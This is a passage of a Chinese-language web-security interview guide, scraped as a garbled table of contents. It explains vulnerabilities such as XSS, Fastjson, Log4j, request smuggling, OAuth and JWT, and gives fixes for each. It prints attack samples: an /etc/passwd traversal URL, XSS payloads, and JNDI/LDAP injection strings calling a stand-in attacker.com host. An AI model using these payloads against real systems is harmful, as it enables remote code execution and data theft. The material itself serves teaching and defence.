2-DNS-%E6%A3%80%E6%9F%A5%EF%BC%9A%EE%88%83%E9%AA%8C%E8%AF%81-URL-%E7%9A%84-DNS-%E8%A7%A3%E6%9E%90%E7%BB%93%E6%9E%9C%EF%BC%8C%E7%A1%AE%E4%BF%9D%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E7%9A%84-IP-%E5%B1%9E%E4%BA%8E%E5%8F%AF%E4%BF%A1%E8%8C%83%E5%9B%B4%E3%80%82"><span class="toc-number">8.</span> <span class="toc-text">漏洞原理：URL 白名单常用于限制用户请求的目标地址，只允许特定的域名或路径。攻击者可以通过某些技术绕过白名单，发起恶意请求。常见的绕过方式包括：- 使用 URL 编码：如 http:&#x2F;&#x2F;example.com%2F%2E%2E%2F（通过 URL 编码绕过路径限制）。- 使用 localhost 或 127.0.0.1 地址直接访问内网服务。利用方式：- 路径绕过：攻击者通过 URL 编码或使用 DNS 重绑定，绕过域名限制：  1http:&#x2F;&#x2F;trusted-site.com&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd修复方案：- 严格白名单规则：验证请求的域名和路径，确保只允许明确的合法地址。- DNS 检查：验证 URL 的 DNS 解析结果，确保目标地址的 IP 属于可信范围。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%EF%BC%9F"><span class="toc-number">8.1.</span> <span class="toc-text">XSS 如何实现？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%EF%BC%88XSS%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%85%81%E8%AE%B8%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E9%80%9A%E5%B8%B8%E9%80%9A%E8%BF%87%E8%BE%93%E5%85%A5%E6%A1%86%E3%80%81URL-%E5%8F%82%E6%95%B0%E7%AD%89%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5-JavaScript-%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%AF%BC%E8%87%B4%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%A7%E8%A1%8C%E4%B8%8D%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%9A%84%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BF%9B%E8%80%8C%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%88%96%E5%8A%AB%E6%8C%81%E4%BC%9A%E8%AF%9D%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-%E5%AD%98%E5%82%A8%E5%9E%8B-XSS%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E5%B0%86%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E5%AD%98%E5%82%A8%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%EF%BC%8C%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E6%97%B6%E8%A7%A6%E5%8F%91%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%EF%BC%9A-%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E9%80%9A%E8%BF%87-URL-%E6%B3%A8%E5%85%A5%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%94%A8%E6%88%B7%E7%82%B9%E5%87%BB%E5%90%8E%E8%A7%A6%E5%8F%91%EF%BC%9A-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%BC%96%E7%A0%81%EF%BC%9A%EE%88%83%E5%AF%B9%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E8%BF%9B%E8%A1%8C%E4%B8%A5%E6%A0%BC%E7%9A%84%E7%BC%96%E7%A0%81%E5%A4%84%E7%90%86%EF%BC%8C%E9%81%BF%E5%85%8D%E5%B0%86%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E7%9B%B4%E6%8E%A5%E6%8F%92%E5%85%A5%E9%A1%B5%E9%9D%A2%EF%BC%9A-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%EF%BC%88CSP%EF%BC%89%EF%BC%9A%EE%88%83%E4%BD%BF%E7%94%A8-Content-Security-Policy-%E5%93%8D%E5%BA%94%E5%A4%B4%EF%BC%8C%E9%99%90%E5%88%B6%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9A%84%E8%84%9A%E6%9C%AC%E6%9D%A5%E6%BA%90%EF%BC%9A"><span class="toc-number">9.</span> <span class="toc-text">漏洞原理：跨站脚本（XSS）漏洞允许攻击者在受害者的浏览器中执行恶意脚本。攻击者通常通过输入框、URL 参数等位置注入 JavaScript 代码，导致浏览器执行不受信任的脚本，进而窃取用户数据或劫持会话。利用方式：- 存储型 XSS：攻击者将恶意脚本存储在服务器端，用户访问时触发脚本执行：  1&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;- 反射型 XSS：攻击者通过 URL 注入恶意脚本，用户点击后触发：  1http:&#x2F;&#x2F;target.com&#x2F;search?q&#x3D;&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;修复方案：- 输入输出编码：对所有用户输入进行严格的编码处理，避免将恶意脚本直接插入页面：  1echo htmlspecialchars($user_input, ENT_QUOTES, &#39;UTF-8&#39;);- 内容安全策略（CSP）：使用 Content-Security-Policy 响应头，限制可执行的脚本来源：  1Content-Security-Policy: script-src &#39;self&#39; https:&#x2F;&#x2F;trusted-cdn.com;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson%E3%80%81Log4j-%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9F%E5%A6%82%E4%BD%95%E5%BA%95%E5%B1%82%E8%A7%A3%E5%86%B3%E8%AF%A5%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">9.1.</span> <span class="toc-text">Fastjson、Log4j 常见漏洞原理？如何底层解决该漏洞？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9AFastjson-%E6%98%AF%E4%B8%80%E4%B8%AA-JSON-%E5%A4%84%E7%90%86%E5%BA%93%EF%BC%8C%E6%9B%BE%E6%9A%B4%E9%9C%B2%E5%87%BA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E9%80%9A%E8%BF%87%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F-JSON-%E6%95%B0%E6%8D%AE%EF%BC%8C%E5%88%A9%E7%94%A8-Fastjson-%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E5%8A%9F%E8%83%BD%EF%BC%8C%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E3%80%82%E6%AD%A4%E6%BC%8F%E6%B4%9E%E8%A2%AB%E7%A7%B0%E4%B8%BA-AutoType-%E6%BC%8F%E6%B4%9E%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8-Fastjson-%E7%9A%84-AutoType-%E7%89%B9%E6%80%A7%EF%BC%8C%E5%8F%91%E9%80%81%E6%81%B6%E6%84%8F-JSON-%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%8E%E8%80%8C%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E3%80%82-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%A6%81%E7%94%A8-AutoType%EF%BC%9A%EE%88%83%E7%A6%81%E7%94%A8%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%EF%BC%8C%E9%81%BF%E5%85%8D%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%81%B6%E6%84%8F%E7%B1%BB%E5%9E%8B%EF%BC%9A-Log4j-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9ALog4j-%E6%98%AF%E4%B8%80%E6%AC%BE%E6%B5%81%E8%A1%8C%E7%9A%84-Java-%E6%97%A5%E5%BF%97%E6%A1%86%E6%9E%B6%EF%BC%8C%E6%9B%BE%E5%9B%A0-JNDI-%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88RCE%EF%BC%89%E6%BC%8F%E6%B4%9E%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8%E7%89%B9%E5%88%B6%E7%9A%84%E6%97%A5%E5%BF%97%E8%BE%93%E5%85%A5%EF%BC%8C%E9%80%9A%E8%BF%87-JNDI-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%B1%BB%EF%BC%8C%E4%BB%8E%E8%80%8C%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-JNDI-%E6%B3%A8%E5%85%A5%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%91%E9%80%81%E6%81%B6%E6%84%8F%E6%97%A5%E5%BF%97%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%A7%A6%E5%8F%91-Log4j-%E5%90%91%E8%BF%9C%E7%A8%8B-JNDI-%E6%9C%8D%E5%8A%A1%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%B1%BB%EF%BC%9A-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E6%9B%B4%E6%96%B0-Log4j-%E7%89%88%E6%9C%AC%EF%BC%9A%EE%88%83%E7%AB%8B%E5%8D%B3%E5%8D%87%E7%BA%A7%E5%88%B0-Log4j-2-16-0-%E6%88%96%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%EF%BC%8C%E7%A6%81%E7%94%A8-JNDI-%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%E3%80%82-%E7%A6%81%E7%94%A8-JNDI%EF%BC%9A%EE%88%83%E9%80%9A%E8%BF%87%E9%85%8D%E7%BD%AE-Log4j-%E7%A6%81%E7%94%A8-JNDI-%E6%9F%A5%E6%89%BE%EF%BC%9A"><span class="toc-number">10.</span> <span class="toc-text">Fastjson 漏洞原理：Fastjson 是一个 JSON 处理库，曾暴露出反序列化漏洞，攻击者可通过构造恶意 JSON 数据，利用 Fastjson 的自动类型转换功能，执行任意代码。此漏洞被称为 AutoType 漏洞。利用方式：- 反序列化攻击：攻击者利用 Fastjson 的 AutoType 特性，发送恶意 JSON 数据，触发反序列化漏洞，从而执行恶意代码。  1{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;attacker.com&#x2F;malicious&quot;}修复方案：- 禁用 AutoType：禁用不必要的类型转换，避免反序列化恶意类型：  1ParserConfig.getGlobalInstance().setAutoTypeSupport(false);Log4j 漏洞原理：Log4j 是一款流行的 Java 日志框架，曾因 JNDI 查找功能导致远程代码执行（RCE）漏洞。攻击者利用特制的日志输入，通过 JNDI 远程加载恶意类，从而执行代码。利用方式：- JNDI 注入：攻击者发送恶意日志数据，触发 Log4j 向远程 JNDI 服务加载恶意类：  1${jndi:ldap:&#x2F;&#x2F;attacker.com&#x2F;malicious}修复方案：- 更新 Log4j 版本：立即升级到 Log4j 2.16.0 或更高版本，禁用 JNDI 查找功能。- 禁用 JNDI：通过配置 Log4j 禁用 JNDI 查找：  1log4j2.formatMsgNoLookups&#x3D;true</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%85%B7%E4%BD%93%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="toc-number">10.1.</span> <span class="toc-text">业务逻辑漏洞具体类型：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%AA%E4%BA%9B%E8%B4%A6%E6%88%B7%E7%8A%B6%E6%80%81%E4%BC%9A%E5%AF%BC%E8%87%B4%E9%A2%84%E6%9C%9F%E5%A4%96%E7%9A%84%E9%A3%8E%E9%99%A9%EF%BC%9A"><span class="toc-number">10.2.</span> <span class="toc-text">哪些账户状态会导致预期外的风险：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E6%A0%87%E8%AF%86%E6%98%8E%E6%96%87%E4%BC%A0%E8%BE%93%E4%BC%9A%E5%AF%BC%E8%87%B4%E7%9A%84%E9%A3%8E%E9%99%A9%EF%BC%9A"><span class="toc-number">10.3.</span> <span class="toc-text">身份标识明文传输会导致的风险：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E8%A7%A6%E5%8F%91%E7%82%B9%E4%BC%9A%E5%AD%98%E5%9C%A8%E7%9A%84%E4%BD%8D%E7%BD%AE%EF%BC%9A"><span class="toc-number">10.4.</span> <span class="toc-text">水平越权触发点会存在的位置：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-number">10.5.</span> <span class="toc-text">水平越权有哪几种检测方式：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%95%B0%E5%AD%97%E5%8A%A0%E5%87%8F%E9%81%8D%E5%8E%86%E6%88%96%E9%80%9A%E8%BF%87%E4%B8%A4%E4%B8%AA%E8%B4%A6%E5%8F%B7%E4%BA%92%E6%B5%8B%E7%9A%84%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%B5%8B%E8%AF%95%E7%9A%84%E4%BC%98%E5%8A%A3%E5%8A%BF%EF%BC%9A"><span class="toc-number">10.6.</span> <span class="toc-text">通过数字加减遍历或通过两个账号互测的方式进行水平越权测试的优劣势：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS-%E5%8E%9F%E7%90%86%E3%80%81%E5%88%A9%E7%94%A8%E5%8F%8A%E4%BF%AE%E5%A4%8D%EF%BC%9F-1"><span class="toc-number">10.7.</span> <span class="toc-text">CORS 原理、利用及修复？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E9%85%8D%E7%BD%AE%E4%B8%A5%E6%A0%BC%E7%9A%84CORS%E7%AD%96%E7%95%A5%EF%BC%8C%E4%BB%85%E5%85%81%E8%AE%B8%E4%BF%A1%E4%BB%BB%E7%9A%84%E6%BA%90%E8%AE%BF%E9%97%AE%E8%B5%84%E6%BA%90%E3%80%82-%E4%BD%BF%E7%94%A8%E9%A2%84%E6%A3%80%E8%AF%B7%E6%B1%82%EF%BC%88OPTIONS%E8%AF%B7%E6%B1%82%EF%BC%89%EF%BC%8C%E5%9C%A8%E5%AE%9E%E9%99%85%E8%AF%B7%E6%B1%82%E4%B9%8B%E5%89%8D%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E6%A0%A1%E9%AA%8C%E3%80%82"><span class="toc-number">11.</span> <span class="toc-text">修复方案：- 配置严格的CORS策略，仅允许信任的源访问资源。- 使用预检请求（OPTIONS请求），在实际请求之前进行权限校验。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%90%E4%B8%AAAPP%E7%9A%84%E6%9F%90%E4%B8%AA%E5%8A%9F%E8%83%BD%E6%8C%89%E9%92%AE%E6%98%AF%E7%81%B0%E8%89%B2%E4%B8%8D%E5%8F%AF%E7%94%A8%E7%8A%B6%E6%80%81%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E5%85%B6%E9%99%90%E5%88%B6%EF%BC%9F"><span class="toc-number">11.1.</span> <span class="toc-text">某个APP的某个功能按钮是灰色不可用状态，如何绕过其限制？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E6%8A%BD%E8%B1%A1%E7%90%86%E8%A7%A3%E5%BD%92%E7%B1%BB%EF%BC%9F"><span class="toc-number">11.2.</span> <span class="toc-text">流程绕过漏洞如何抽象理解归类？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TLS-1-2-%E5%8D%8F%E8%AE%AE%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="toc-number">11.3.</span> <span class="toc-text">TLS 1.2 协议交互过程以及攻击方法？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E5%BC%BA%E5%88%B6%E4%BD%BF%E7%94%A8-TLS-1-2-%EF%BC%8C%E7%A6%81%E7%94%A8%E4%BD%8E%E7%89%88%E6%9C%AC%E3%80%82-%E5%90%AF%E7%94%A8-HSTS%EF%BC%8C%E9%98%B2%E6%AD%A2%E9%99%8D%E7%BA%A7%E6%94%BB%E5%87%BB%E3%80%82-%E4%BD%BF%E7%94%A8-PFS%EF%BC%88Perfect-Forward-Secrecy%EF%BC%89%EF%BC%8C%E9%98%B2%E6%AD%A2%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2%E5%BD%B1%E5%93%8D%E5%8E%86%E5%8F%B2%E6%95%B0%E6%8D%AE%E3%80%82"><span class="toc-number">12.</span> <span class="toc-text">修复方案：- 强制使用 TLS 1.2+，禁用低版本。- 启用 HSTS，防止降级攻击。- 使用 PFS（Perfect Forward Secrecy），防止密钥泄露影响历史数据。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%EF%BC%88HTTP-Request-Smuggling%EF%BC%89%E5%8E%9F%E7%90%86"><span class="toc-number">12.1.</span> <span class="toc-text">HTTP 请求走私（HTTP Request Smuggling）原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-CL-TE-%E6%94%BB%E5%87%BB%EF%BC%9A-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%BB%9F%E4%B8%80-Content-Length-%E5%92%8C-Transfer-Encoding-%E7%9A%84%E8%A7%A3%E6%9E%90%E9%80%BB%E8%BE%91%E3%80%82-%E5%9C%A8-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%A6%81%E7%94%A8-Transfer-Encoding-chunked%E3%80%82-%E4%BD%BF%E7%94%A8%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E5%A6%82-Nginx%E3%80%81Apache%EF%BC%8C%E4%BF%AE%E5%A4%8D%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E3%80%82"><span class="toc-number">13.</span> <span class="toc-text">利用方式：- CL.TE 攻击：  1234567POST &#x2F; HTTP&#x2F;1.1Host: target.comContent-Length: 15Transfer-Encoding: chunked0GET &#x2F;admin HTTP&#x2F;1.1修复方案：- 统一 Content-Length 和 Transfer-Encoding 的解析逻辑。- 在 Web 服务器和代理服务器中禁用 Transfer-Encoding: chunked。- 使用最新版本的 Web 服务器，如 Nginx、Apache，修复已知漏洞。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSSEC-%E8%83%BD%E8%A7%A3%E5%86%B3%E4%BB%80%E4%B9%88%E5%9C%BA%E6%99%AF%E9%97%AE%E9%A2%98%EF%BC%9F"><span class="toc-number">13.1.</span> <span class="toc-text">DNSSEC 能解决什么场景问题？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6%EF%BC%9A-DNSSEC-%E4%B8%8D%E8%83%BD%E5%8A%A0%E5%AF%86-DNS-%E6%9F%A5%E8%AF%A2%E5%86%85%E5%AE%B9%EF%BC%8C%E4%BB%8D%E7%84%B6%E5%AE%B9%E6%98%93%E8%A2%AB%E7%9B%91%E6%8E%A7%E3%80%82-%E9%83%A8%E7%BD%B2%E5%A4%8D%E6%9D%82%EF%BC%8C%E4%B8%94%E9%9C%80%E8%A6%81%E4%B8%8A%E7%BA%A7-DNS-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%AF%E6%8C%81%E3%80%82"><span class="toc-number">14.</span> <span class="toc-text">限制：- DNSSEC 不能加密 DNS 查询内容，仍然容易被监控。- 部署复杂，且需要上级 DNS 服务器支持。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-%E8%AE%B0%E5%BD%95%EF%BC%88DS%E3%80%81PTR%E3%80%81TXT%EF%BC%89%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%B8%B8%E8%A7%81%E4%BD%9C%E7%94%A8%EF%BC%9F"><span class="toc-number">14.1.</span> <span class="toc-text">DNS 记录（DS、PTR、TXT）类型的常见作用？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A-SPF-%E8%AE%B0%E5%BD%95%EF%BC%88TXT%EF%BC%89%EF%BC%9A-%E4%BD%9C%E7%94%A8%EF%BC%9A%E6%8C%87%E5%AE%9A%E5%85%81%E8%AE%B8%E7%9A%84%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E9%98%B2%E6%AD%A2%E4%BC%AA%E9%80%A0%E9%82%AE%E4%BB%B6%E3%80%82"><span class="toc-number">15.</span> <span class="toc-text">示例：- SPF 记录（TXT）：  1example.com TXT &quot;v&#x3D;spf1 ip4:192.168.1.1 -all&quot;  作用：指定允许的邮件发送服务器，防止伪造邮件。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E6%9A%82%E6%97%B6%E4%B8%8D%E7%94%A8%E7%9A%84%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E5%88%B0-1-1-1-1-%E6%9C%89%E4%BB%80%E4%B9%88%E5%A5%BD%E5%A4%84%E5%92%8C%E5%9D%8F%E5%A4%84%EF%BC%9F"><span class="toc-number">15.1.</span> <span class="toc-text">将暂时不用的域名解析到 1.1.1.1 有什么好处和坏处？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E5%AE%89%E5%85%A8%E7%9A%84%E5%81%9A%E6%B3%95%EF%BC%9A-%E7%9B%B4%E6%8E%A5%E5%88%A0%E9%99%A4%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95%EF%BC%8C%E6%88%96%E8%AE%BE%E7%BD%AE-NXDOMAIN-%E5%93%8D%E5%BA%94%E3%80%82"><span class="toc-number">16.</span> <span class="toc-text">更安全的做法：- 直接删除域名解析记录，或设置 NXDOMAIN 响应。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OAuth-%E9%99%A4%E4%BA%86-redirect-uri-%E7%BB%95%E8%BF%87%E9%97%AE%E9%A2%98%E5%A4%96%EF%BC%8C%E8%BF%98%E6%9C%89%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BF%AE%E5%A4%8D%EF%BC%9F"><span class="toc-number">16.1.</span> <span class="toc-text">OAuth 除了 redirect_uri 绕过问题外，还有哪些风险以及如何修复？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E5%BC%BA%E5%88%B6%E6%A0%A1%E9%AA%8C-state-%E5%8F%82%E6%95%B0%EF%BC%8C%E9%98%B2%E6%AD%A2-CSRF%EF%BC%9A-%E4%B8%A5%E6%A0%BC%E9%AA%8C%E8%AF%81-redirect-uri-%EF%BC%8C%E9%81%BF%E5%85%8D%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0%E6%94%BB%E5%87%BB%E8%80%85%E7%AB%99%E7%82%B9%EF%BC%9A-%E4%BD%BF%E7%94%A8%E7%9F%AD%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F-Token%EF%BC%8C%E9%81%BF%E5%85%8D%E9%95%BF%E6%9C%9F%E6%9A%B4%E9%9C%B2%EF%BC%9A-Access-Token-%E4%BB%85%E5%8F%AF%E4%BD%BF%E7%94%A8%E4%B8%80%E6%AC%A1-%E4%BD%BF%E7%94%A8-Refresh-Token-%E8%BF%9B%E8%A1%8C%E9%95%BF%E6%97%B6%E9%97%B4%E4%BC%9A%E8%AF%9D%E7%BB%B4%E6%8A%A4-%E5%85%A8%E7%A8%8B%E4%BD%BF%E7%94%A8-HTTPS%EF%BC%8C%E9%98%B2%E6%AD%A2-Token-%E8%A2%AB%E7%AA%83%E5%90%AC"><span class="toc-number">17.</span> <span class="toc-text">修复方案：- 强制校验 state 参数，防止 CSRF：  123state &#x3D; generate_secure_token()session[&quot;oauth_state&quot;] &#x3D; stateredirect_uri &#x3D; f&quot;https:&#x2F;&#x2F;auth.com&#x2F;oauth?state&#x3D;{state}&quot;- **严格验证 redirect_uri**，避免重定向到攻击者站点：  12if not redirect_uri.startswith(&quot;https:&#x2F;&#x2F;trusted-site.com&quot;):    abort(403)- 使用短生命周期 Token，避免长期暴露：  - Access Token 仅可使用一次  - 使用 Refresh Token 进行长时间会话维护  - 全程使用 HTTPS，防止 Token 被窃听</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT-%E7%9B%B8%E8%BE%83%E4%BA%8E-SESSION-%E7%9A%84%E4%BC%98%E5%8A%BF%EF%BC%9F"><span class="toc-number">17.1.</span> <span class="toc-text">JWT 相较于 SESSION 的优势？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%B3%A8%E6%84%8F%E7%82%B9%EF%BC%9A-JWT-%E4%B8%80%E6%97%A6%E6%B3%84%E9%9C%B2%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E9%95%BF%E6%9C%9F%E4%BD%BF%E7%94%A8%EF%BC%8C%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8%E7%9F%AD%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F-Token%E3%80%82-%E9%9C%80%E4%BD%BF%E7%94%A8-RS256%EF%BC%88%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%EF%BC%89-%E6%88%96-HS256%EF%BC%88%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%EF%BC%89%EF%BC%8C%E9%81%BF%E5%85%8D-none-%E7%AE%97%E6%B3%95%E6%BC%8F%E6%B4%9E%E3%80%82"><span class="toc-number">18.</span> <span class="toc-text">安全注意点：- JWT 一旦泄露，攻击者可以长期使用，建议使用短生命周期 Token。- 需使用 RS256（非对称加密） 或 HS256（对称加密），避免 none 算法漏洞。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 